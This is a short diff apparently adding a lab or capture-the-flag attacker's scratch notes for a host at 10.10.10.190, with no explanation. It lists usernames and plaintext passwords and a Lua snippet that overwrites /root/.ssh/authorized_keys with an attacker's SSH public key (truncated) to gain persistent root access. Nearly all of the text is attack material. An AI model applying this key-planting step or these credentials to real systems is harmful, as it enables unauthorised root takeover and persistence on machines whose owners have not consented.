@@ -1,0 +1,13 @@
+ 
+ http://10.10.10.190
+ 
+ MinatoTW
+bihys1amFov
+ 
+ user felamos
+ pass tieb0graQueg
+ 
+ 
+ file = io.open("/root/.ssh/authorized_keys","w")
+ file:write(" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDx4Osb4aGE5wIKLfXjTpBjj1e0s7TnHiCwKtT>
+ file:close()
